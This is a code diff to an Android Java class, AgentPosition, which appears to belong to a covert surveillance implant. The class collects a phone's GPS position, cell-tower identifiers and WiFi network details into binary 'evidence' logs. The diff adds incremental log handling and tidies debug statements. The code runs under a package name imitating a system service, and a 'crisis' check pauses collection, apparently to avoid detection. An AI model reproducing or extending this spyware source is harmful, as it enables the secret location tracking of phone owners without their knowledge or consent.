@@ -29,13 +29,14 @@ import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
+import com.android.service.interfaces.IncrementalLog;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 
-public class AgentPosition extends AgentBase implements LocationListener {
-	private static final String TAG = "AgentPosition";
+public class AgentPosition extends AgentBase implements IncrementalLog, LocationListener {
+	private static final String TAG = "AgentPosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
 	private static final int TYPE_WIFI = 4;
@@ -55,12 +56,42 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 	int period;
 
+	LogR logIncrGPS, logIncrCell;
+
 	@Override
 	public void begin() {
+
+		if (gpsEnabled) {
+			logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+		}
+
+		if (cellEnabled) {
+			logIncrCell = factoryCellLog();
+		}
 
 		locator = new GPSLocatorPeriod(this, period);
 		locator.start();
 
+	}
+
+	private LogR factoryCellLog() {
+		LogR logCell = null;
+		final CellInfo info = Device.getCellInfo();
+		if (!info.valid) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			return null;
+		}
+
+		if (info.gsm) {
+			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GSM));
+		} else if (info.cdma) {
+			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA));
+
+		}
+
+		return logCell;
 	}
 
 	@Override
@@ -68,17 +99,25 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		locator.halt();
 		try {
 			locator.join();
-		} catch (InterruptedException e) {
-			if(Cfg.DEBUG) { Check.log(e); }
+		} catch (final InterruptedException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e);//$NON-NLS-1$
+			}
 		}
 		locator = null;
+
+		if (logIncrCell != null) {
+			logIncrCell.close();
+		}
+		if (logIncrGPS != null) {
+			logIncrGPS.close();
+		}
 	}
 
 	@Override
 	public boolean parse(AgentConf conf) {
-		byte[] confParameters = conf.getParams();
-		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
-				confParameters.length);
+		final byte[] confParameters = conf.getParams();
+		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);
 		try {
 			// millisecondi
 			period = databuffer.readInt();
@@ -88,30 +127,45 @@ public class AgentPosition extends AgentBase implements LocationListener {
 				gpsEnabled = ((type & TYPE_GPS) != 0);
 			} else {
 
-				if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "GPS Disabled at compile time");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Warn: " + "GPS Disabled at compile time");//$NON-NLS-1$ //$NON-NLS-2$
+				}
 
 			}
 			cellEnabled = ((type & TYPE_CELL) != 0);
 			wifiEnabled = ((type & TYPE_WIFI) != 0);
 
-			if(Cfg.DEBUG) Check.asserts(period > 0, "parse period: " + period);
-			// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
-			// + type);
+			if (Cfg.DEBUG) {
+				Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
+				// if(Cfg.DEBUG) Check.asserts(type == 1 || type == 2 || type == //$NON-NLS-1$
+				// 4, "parse type: "
+				// + type);
+			}
 
-
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Type: " + type);
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Period: " + period);
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "cellEnabled: " + cellEnabled);
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
-
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "Type: " + type);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "Period: " + period);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
 			setPeriod(period);
 			setDelay(POSITION_DELAY);
 
 		} catch (final IOException e) {
 
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + e.toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
+			}
 
 			return false;
 		}
@@ -123,45 +177,53 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	public void go() {
 
 		if (Status.self().crisisPosition()) {
-			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Crisis!");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
+			}
 			return;
 		}
 
 		if (gpsEnabled) {
-
-			if(Cfg.DEBUG) Check.log( TAG + " actualRun: gps");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " actualRun: gps");//$NON-NLS-1$
+			}
 
 			locationGPS();
 		}
-		if (cellEnabled) {
 
-			if(Cfg.DEBUG) Check.log( TAG + " actualRun: cell");
+		if (cellEnabled) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " actualRun: cell");//$NON-NLS-1$
+			}
 
 			locationCELL();
 		}
-		if (wifiEnabled) {
 
-			if(Cfg.DEBUG) Check.log( TAG + " actualRun: wifi");
+		if (wifiEnabled) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " actualRun: wifi");//$NON-NLS-1$
+			}
 
 			locationWIFI();
 		}
 	}
 
 	private void locationWIFI() {
-		WifiManager wifiManager = (WifiManager) Status.getAppContext()
-				.getSystemService(Context.WIFI_SERVICE);
+		final WifiManager wifiManager = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
 
-		WifiInfo wifi = wifiManager.getConnectionInfo();
+		final WifiInfo wifi = wifiManager.getConnectionInfo();
 
 		if (wifi != null && wifi.getBSSID() != null) {
 
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "Wifi: " + wifi.getBSSID());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "Wifi: " + wifi.getBSSID());//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
-			final byte[] payload = getWifiPayload(wifi.getBSSID(),
-					wifi.getSSID(), wifi.getRssi());
+			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(), wifi.getRssi());
 
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-					getAdditionalData(1, LOG_TYPE_WIFI), payload);
+			synchronized (this) {
+				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(1, LOG_TYPE_WIFI), payload);
+			}
 
 			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
 			// EvidenceType.LOCATION_NEW);
@@ -169,7 +231,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			// logWifi.close();
 		} else {
 
-			if(Cfg.DEBUG) Check.log( TAG + " Warn: " + "Wifi disabled");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "Wifi disabled");//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
 		}
 
@@ -181,57 +245,75 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	 */
 	private void locationCELL() {
 
-		CellInfo info = Device.getCellInfo();
+		final CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "invalid cell info");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "invalid cell info");//$NON-NLS-1$ //$NON-NLS-2$
+			}
 			return;
 		}
 
+		byte[] payload = null;
 		if (info.gsm) {
-			final byte[] payload = getCellPayload(info, LOG_TYPE_GSM);
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-					getAdditionalData(0, LOG_TYPE_GSM), payload);
+			payload = getCellPayload(info, LOG_TYPE_GSM);
+			synchronized (this) {
+				logIncrCell.write(payload);
+			}
+
+		} else if (info.cdma) {
+			payload = getCellPayload(info, LOG_TYPE_CDMA);
+			synchronized (this) {
+				logIncrCell.write(payload);
+			}
 		}
-		if (info.cdma) {
-			final byte[] payload = getCellPayload(info, LOG_TYPE_CDMA);
-			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-					getAdditionalData(0, LOG_TYPE_CDMA), payload);
-		}
+
 	}
 
 	private void locationGPS() {
 		if (locator == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "GPS Not Supported on Device");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "GPS Not Supported on Device");//$NON-NLS-1$ //$NON-NLS-2$
+			}
 			return;
 		}
 
 		if (lastLocation == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " waitingForPoint");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " waitingForPoint");//$NON-NLS-1$
+			}
 
 			return;
 		}
 
-		if(Cfg.DEBUG) Check.log( TAG + " newLocation");
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " newLocation");//$NON-NLS-1$
+		}
 
 		byte[] payload;
 		synchronized (this) {
 			final long timestamp = lastLocation.getTime();
 
-			if(Cfg.DEBUG) Check.log( TAG + " valid");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " valid");//$NON-NLS-1$
+			}
 
 			payload = getGPSPayload(lastLocation, timestamp);
 			lastLocation = null;
 		}
 
-		new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-		 getAdditionalData(0, LOG_TYPE_GPS), payload);
+		// new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+		// getAdditionalData(0, LOG_TYPE_GPS), payload);
 
-		/*Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
-		logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
-				EvidenceType.LOCATION_NEW);
-		logGPS.writeEvidence(payload);
-		logGPS.close();*/
+		synchronized (this) {
+			logIncrGPS.write(payload);
+		}
+
+		/*
+		 * Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
+		 * logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
+		 * EvidenceType.LOCATION_NEW); logGPS.writeEvidence(payload);
+		 * logGPS.close();
+		 */
 
 	}
 
@@ -239,9 +321,11 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 	public void onLocationChanged(Location location) {
 		if (location != null) {
-			double lat = location.getLatitude();
-			double lng = location.getLongitude();
-			if(Cfg.DEBUG) Check.log( TAG + " lat: " + lat + " lon:" + lng);
+			final double lat = location.getLatitude();
+			final double lng = location.getLongitude();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
+			}
 		}
 		synchronized (this) {
 			lastLocation = location;
@@ -268,28 +352,29 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		final int addsize = 12;
 		final byte[] additionalData = new byte[addsize];
-		final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
-				additionalData.length);
+		final DataBuffer addbuffer = new DataBuffer(additionalData, 0, additionalData.length);
 		final int version = 2010082401;
 
 		addbuffer.writeInt(version);
 		addbuffer.writeInt(type);
 		addbuffer.writeInt(structNum);
 
-		if(Cfg.DEBUG) Check.ensures(addbuffer.getPosition() == addsize,
-				"addbuffer wrong size");
-
+		if (Cfg.DEBUG) {
+			Check.ensures(addbuffer.getPosition() == addsize, "addbuffer wrong size"); //$NON-NLS-1$
+		}
 
 		return additionalData;
 	}
 
 	private byte[] messageEvidence(byte[] payload, int type) {
 
-		if(Cfg.DEBUG) Check.requires(payload != null, "saveEvidence payload!= null");
+		if (Cfg.DEBUG) {
+			Check.requires(payload != null, "saveEvidence payload!= null"); //$NON-NLS-1$
+		}
 
-
-		if(Cfg.DEBUG) Check.log( TAG + " saveEvidence payload: " + payload.length);
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " saveEvidence payload: " + payload.length);//$NON-NLS-1$
+		}
 
 		final int version = 2008121901;
 		final Date date = new Date();
@@ -313,9 +398,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		// delimiter
 		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);
 
-		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
-				"saveEvidence wrong size");
-
+		if (Cfg.DEBUG) {
+			Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size"); //$NON-NLS-1$
+		}
 
 		// save log
 
@@ -324,8 +409,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	}
 
 	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
-		if(Cfg.DEBUG) Check.log( TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid
-				+ " signal:" + signalLevel);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid + " signal:" + signalLevel);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+		}
 		final int size = 48;
 		final byte[] payload = new byte[size];
 
@@ -337,8 +423,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			// debug.trace("getWifiPayload " + i + " : "
 			// + Utils.byteArrayToHex(token));
 
-
-			if(Cfg.DEBUG) Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
+			if (Cfg.DEBUG) {
+				Check.asserts(token.length == 1, "getWifiPayload: token wrong size"); //$NON-NLS-1$
+			}
 
 			databuffer.writeByte(token[0]);
 		}
@@ -355,7 +442,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 			place[i] = ssidcontent[i];
 		}
 
-		if(Cfg.DEBUG) Check.log( TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);//$NON-NLS-1$
+		}
 
 		databuffer.writeInt(ssidcontent.length);
 
@@ -363,24 +452,26 @@ public class AgentPosition extends AgentBase implements LocationListener {
 
 		databuffer.writeInt(signalLevel);
 
-		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
-				"databuffer.getPosition wrong size");
+		if (Cfg.DEBUG) {
+			Check.ensures(databuffer.getPosition() == size, "databuffer.getPosition wrong size"); //$NON-NLS-1$
+		}
 
-
-		if(Cfg.DEBUG) Check.ensures(payload.length == size, "payload wrong size");
-
+		if (Cfg.DEBUG) {
+			Check.ensures(payload.length == size, "payload wrong size"); //$NON-NLS-1$
+		}
 
 		return payload;
 	}
 
 	private byte[] getCellPayload(CellInfo info, int logType) {
-		if(Cfg.DEBUG) Check.requires(info.valid, "invalid cell info");
+		if (Cfg.DEBUG) {
+			Check.requires(info.valid, "invalid cell info"); //$NON-NLS-1$
+		}
 
 		final int size = 19 * 4 + 48 + 16;
 		final byte[] cellPosition = new byte[size];
 
-		final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
-				cellPosition.length);
+		final DataBuffer databuffer = new DataBuffer(cellPosition, 0, cellPosition.length);
 
 		databuffer.writeInt(size); // size
 		databuffer.writeInt(0); // params
@@ -410,9 +501,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // BCCH
 		databuffer.write(new byte[16]); // NMR
 
-		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
-				"getCellPayload wrong size");
-
+		if (Cfg.DEBUG) {
+			Check.ensures(databuffer.getPosition() == size, "getCellPayload wrong size"); //$NON-NLS-1$
+		}
 
 		return messageEvidence(cellPosition, logType);
 
@@ -423,7 +514,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 	 */
 	private byte[] getGPSPayload(Location loc, long timestamp) {
 
-		if(Cfg.DEBUG) Check.log( TAG + " getGPSPayload");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " getGPSPayload");//$NON-NLS-1$
+		}
 
 		final Date date = new Date(timestamp);
 
@@ -435,8 +528,9 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		final float speed = loc.getSpeed();
 		final float course = loc.getBearing();
 
-		if(Cfg.DEBUG) Check.log( TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|"
-				+ course + "|" + date);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|" + course + "|" + date);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+		}
 
 		final DateTime dateTime = new DateTime(date);
 
@@ -447,15 +541,14 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		// define GPS_VALID_HEADING 0x00000010
 		// define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION 0x00000200
 		// define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION 0x00000400
-		final int validFields = 0x00000400 | 0x00000200 | 0x00000010
-				| 0x00000008 | 0x00000004 | 0x00000002 | 0x00000001;
+		final int validFields = 0x00000400 | 0x00000200 | 0x00000010 | 0x00000008 | 0x00000004 | 0x00000002
+				| 0x00000001;
 
 		final int size = 344;
 		// struct GPS_POSITION
 		final byte[] gpsPosition = new byte[size];
 
-		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
-				gpsPosition.length);
+		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0, gpsPosition.length);
 
 		// struct GPS_POSITION
 		databuffer.writeInt(0); // version
@@ -492,15 +585,33 @@ public class AgentPosition extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // azimuth view
 		databuffer.write(new byte[48]); // sn view
 
-		if(Cfg.DEBUG) Check.log( TAG + " len: " + databuffer.getPosition());
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " len: " + databuffer.getPosition());//$NON-NLS-1$
+		}
 
-
-		if(Cfg.DEBUG) Check.ensures(databuffer.getPosition() == size,
-				"saveGPSLog wrong size: " + databuffer.getPosition());
-
+		if (Cfg.DEBUG) {
+			Check.ensures(databuffer.getPosition() == size, "saveGPSLog wrong size: " + databuffer.getPosition()); //$NON-NLS-1$
+		}
 
 		return messageEvidence(gpsPosition, LOG_TYPE_GPS);
 
+	}
+
+	public synchronized void resetLog() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (resetLog)");
+		}
+		if (logIncrCell != null && logIncrCell.hasData()) {
+			logIncrCell.close();
+			logIncrCell = logIncrCell = factoryCellLog();
+		}
+
+		if (logIncrGPS != null && logIncrGPS.hasData()) {
+			logIncrGPS.close();
+			if (gpsEnabled) {
+				logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+			}
+		}
 	}
 
 }
